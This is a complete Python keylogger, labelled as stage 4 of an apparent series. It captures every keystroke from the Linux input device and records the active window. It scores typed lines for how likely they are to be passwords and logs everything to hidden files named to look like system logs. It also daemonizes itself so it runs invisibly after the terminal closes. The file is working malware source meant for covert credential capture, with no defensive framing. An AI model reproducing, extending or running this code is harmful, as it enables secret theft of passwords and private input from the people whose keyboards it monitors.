#!/usr/bin/env python3
"""
STAGE 4 — Silent Daemon Keylogger
===================================
What's new vs Stage 3:
  - Runs completely silently in the background (no terminal output)
  - Writes everything to a hidden log file (~/.local/share/.syslog)
  - Structured log format: timestamp|app|title|text|password_score
  - Survives terminal close (daemonizes itself)
  - Auto-rotates log if > 10MB
  - Separate viewer script (stage4_viewer.py) tails the log live

Two terminals:
  Terminal 1 (background): sudo python3 stage4_keylogger.py
  Terminal 2 (hacker view): python3 stage4_viewer.py

Usage:
  sudo python3 stage4_keylogger.py          # start silently
  sudo python3 stage4_keylogger.py --stop   # stop daemon
  sudo python3 stage4_keylogger.py --status # check if running
"""

import evdev
import sys
import os
import subprocess
import json
import signal
import time
from datetime import datetime
from pathlib import Path

# ── Config ───────────────────────────────────────────────────────────────────
KEYBOARD_DEVICE = "/dev/input/event3"
LOG_FILE        = Path.home() / ".local" / "share" / ".syslog"   # buffered line log
KEYSTROKE_LOG   = Path.home() / ".local" / "share" / ".ksraw"    # live per-key log
PID_FILE        = Path("/tmp/.ksvc.pid")                           # hidden pid
MAX_LOG_SIZE    = 10 * 1024 * 1024                                 # 10MB

KEYMAP = {
    "KEY_A": ("a","A"), "KEY_B": ("b","B"), "KEY_C": ("c","C"),
    "KEY_D": ("d","D"), "KEY_E": ("e","E"), "KEY_F": ("f","F"),
    "KEY_G": ("g","G"), "KEY_H": ("h","H"), "KEY_I": ("i","I"),
    "KEY_J": ("j","J"), "KEY_K": ("k","K"), "KEY_L": ("l","L"),
    "KEY_M": ("m","M"), "KEY_N": ("n","N"), "KEY_O": ("o","O"),
    "KEY_P": ("p","P"), "KEY_Q": ("q","Q"), "KEY_R": ("r","R"),
    "KEY_S": ("s","S"), "KEY_T": ("t","T"), "KEY_U": ("u","U"),
    "KEY_V": ("v","V"), "KEY_W": ("w","W"), "KEY_X": ("x","X"),
    "KEY_Y": ("y","Y"), "KEY_Z": ("z","Z"),
    "KEY_1": ("1","!"), "KEY_2": ("2","@"), "KEY_3": ("3","#"),
    "KEY_4": ("4","$"), "KEY_5": ("5","%"), "KEY_6": ("6","^"),
    "KEY_7": ("7","&"), "KEY_8": ("8","*"), "KEY_9": ("9","("),
    "KEY_0": ("0",")"),
    "KEY_MINUS":      ("-","_"),  "KEY_EQUAL":      ("=","+"),
    "KEY_LEFTBRACE":  ("[","{"),  "KEY_RIGHTBRACE": ("]","}"),
    "KEY_SEMICOLON":  (";",":"),  "KEY_APOSTROPHE": ("'",'"'),
    "KEY_GRAVE":      ("`","~"),  "KEY_BACKSLASH":  ("\\","|"),
    "KEY_COMMA":      (",","<"),  "KEY_DOT":        (".",">"),
    "KEY_SLASH":      ("/","?"),  "KEY_SPACE":      (" "," "),
    "KEY_TAB":        ("\t","\t"),
}

# ── Helpers ──────────────────────────────────────────────────────────────────

def get_active_window():
    try:
        sig = os.environ.get("HYPRLAND_INSTANCE_SIGNATURE")
        if not sig:
            for base in [Path("/run/user/1000/hypr"), Path("/tmp/hypr")]:
                if base.exists():
                    entries = list(base.iterdir())
                    if entries:
                        sig = entries[0].name
                        break
        if not sig:
            return "unknown", "unknown"

        socket_path = None
        for base in [f"/run/user/1000/hypr/{sig}", f"/tmp/hypr/{sig}"]:
            candidate = f"{base}/.socket.sock"
            if Path(candidate).exists():
                socket_path = candidate
                break
        if not socket_path:
            return "unknown", "unknown"

        result = subprocess.run(
            ["sudo", "-u", "#1000", "sh", "-c",
             f'echo -n "j/activewindow" | socat - "UNIX-CONNECT:{socket_path}"'],
            capture_output=True, text=True, timeout=1
        )
        if result.returncode != 0 or not result.stdout.strip():
            return "unknown", "unknown"
        data  = json.loads(result.stdout)
        return data.get("class", "unknown"), data.get("title", "unknown")
    except Exception:
        return "unknown", "unknown"


def write_keystroke(app, char, special=None):
    """Write a single keystroke immediately to the live feed log."""
    try:
        KEYSTROKE_LOG.parent.mkdir(parents=True, exist_ok=True)
        ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
        if special:
            line = f"{ts}|{app}|[{special}]\n"
        else:
            line = f"{ts}|{app}|{char}\n"
        with open(KEYSTROKE_LOG, "a") as f:
            f.write(line)
    except Exception:
        pass


def password_score(text):
    if len(text) < 6:
        return 0
    score = 0
    if any(c.isupper() for c in text): score += 20
    if any(c.islower() for c in text): score += 20
    if any(c.isdigit() for c in text): score += 20
    if any(c in "!@#$%^&*()_+-=[]{}|;':\",./<>?" for c in text): score += 30
    if len(text) >= 8:                 score += 10
    return score


def write_log(app, title, text):
    """Append a captured entry to the hidden log file."""
    try:
        LOG_FILE.parent.mkdir(parents=True, exist_ok=True)

        # Rotate if too large
        if LOG_FILE.exists() and LOG_FILE.stat().st_size > MAX_LOG_SIZE:
            LOG_FILE.rename(str(LOG_FILE) + ".1")

        ts    = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        score = password_score(text)
        line  = f"{ts}|{app}|{title}|{text}|{score}\n"

        with open(LOG_FILE, "a") as f:
            f.write(line)
    except Exception:
        pass


def daemonize():
    """
    Double-fork to fully detach from the terminal.
    After this the process has no controlling TTY —
    it survives terminal close and runs invisibly.
    """
    # First fork
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)   # parent exits
    except OSError:
        sys.exit(1)

    # Become session leader
    os.setsid()

    # Second fork — prevents re-acquiring a TTY
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError:
        sys.exit(1)

    # Redirect stdin/stdout/stderr to /dev/null
    sys.stdout.flush()
    sys.stderr.flush()
    with open(os.devnull, "r") as f:
        os.dup2(f.fileno(), sys.stdin.fileno())
    with open(os.devnull, "a+") as f:
        os.dup2(f.fileno(), sys.stdout.fileno())
        os.dup2(f.fileno(), sys.stderr.fileno())


def write_pid():
    with open(PID_FILE, "w") as f:
        f.write(str(os.getpid()))


def read_pid():
    try:
        return int(PID_FILE.read_text().strip())
    except Exception:
        return None


def is_running(pid):
    try:
        os.kill(pid, 0)
        return True
    except (ProcessLookupError, PermissionError):
        return False


# ── CLI commands ─────────────────────────────────────────────────────────────

def cmd_status():
    pid = read_pid()
    if pid and is_running(pid):
        print(f"[+] Keylogger running  (PID {pid})")
        print(f"[+] Log file: {LOG_FILE}")
        if LOG_FILE.exists():
            size  = LOG_FILE.stat().st_size
            lines = sum(1 for _ in open(LOG_FILE))
            print(f"[+] Log size: {size} bytes, {lines} entries captured")
    else:
        print("[-] Keylogger not running")


def cmd_stop():
    pid = read_pid()
    if pid and is_running(pid):
        os.kill(pid, signal.SIGTERM)
        PID_FILE.unlink(missing_ok=True)
        print(f"[+] Stopped keylogger (PID {pid})")
    else:
        print("[-] No running keylogger found")


# ── Core capture loop ─────────────────────────────────────────────────────────

def run():
    try:
        device = evdev.InputDevice(KEYBOARD_DEVICE)
    except Exception:
        sys.exit(1)

    shift_held  = False
    caps_lock   = False
    ctrl_held   = False
    text_buffer = []
    tick        = 0

    current_app, current_title = get_active_window()

    # Write startup marker to log
    write_log("__system__", "__start__",
              f"keylogger started pid={os.getpid()}")

    for event in device.read_loop():
        if event.type != evdev.ecodes.EV_KEY:
            continue

        key     = evdev.categorize(event)
        keyname = key.keycode if isinstance(key.keycode, str) else key.keycode[0]

        # Modifier tracking
        if keyname in ("KEY_LEFTSHIFT", "KEY_RIGHTSHIFT"):
            shift_held = (event.value != 0)
            continue
        if keyname in ("KEY_LEFTCTRL", "KEY_RIGHTCTRL"):
            ctrl_held = (event.value != 0)
            continue
        if keyname in ("KEY_LEFTALT", "KEY_RIGHTALT",
                       "KEY_LEFTMETA", "KEY_RIGHTMETA"):
            continue

        if keyname == "KEY_CAPSLOCK" and event.value == 1:
            caps_lock = not caps_lock
            continue

        if event.value not in (1, 2):
            continue

        # Refresh window on every keypress for accuracy
        current_app, current_title = get_active_window()

        if keyname in KEYMAP and not ctrl_held:
            normal, shifted = KEYMAP[keyname]
            char = (shifted if (shift_held ^ caps_lock) else normal)
            text_buffer.append(char)
            # encode space explicitly so it survives the pipe split
            safe = "[SPACE]" if char == " " else char
            write_keystroke(current_app, safe)

        elif keyname == "KEY_BACKSPACE":
            if text_buffer:
                text_buffer.pop()
            write_keystroke(current_app, "", special="BACKSPACE")

        elif keyname == "KEY_ENTER":
            write_keystroke(current_app, "", special="ENTER")
            if text_buffer:
                text = "".join(text_buffer)
                app_now, title_now = get_active_window()
                write_log(app_now, title_now, text)
            text_buffer = []
            current_app, current_title = get_active_window()

        elif keyname == "KEY_TAB":
            write_keystroke(current_app, "", special="TAB")
            if text_buffer:
                text = "".join(text_buffer)
                app_now, title_now = get_active_window()
                write_log(app_now, title_now, f"{text}[TAB]")
            text_buffer = []

        elif ctrl_held:
            write_keystroke(current_app, "", special=f"CTRL+{keyname.replace('KEY_','')}")


# ── Entry point ───────────────────────────────────────────────────────────────

def main():
    if len(sys.argv) > 1:
        if sys.argv[1] == "--stop":
            cmd_stop(); return
        if sys.argv[1] == "--status":
            cmd_status(); return

    # Check already running
    pid = read_pid()
    if pid and is_running(pid):
        print(f"[!] Already running (PID {pid}). Use --stop first.")
        return

    print(f"[+] Starting keylogger daemon...")
    print(f"[+] Log file: {LOG_FILE}")
    print(f"[+] PID file: {PID_FILE}")
    print(f"[+] Use: sudo python3 stage4_keylogger.py --status")
    print(f"[+] Use: sudo python3 stage4_keylogger.py --stop")
    print(f"[+] View live: python3 stage4_viewer.py")
    print(f"[+] Daemonizing now — this terminal will return to prompt.")

    daemonize()
    write_pid()
    run()


if __name__ == "__main__":
    main()
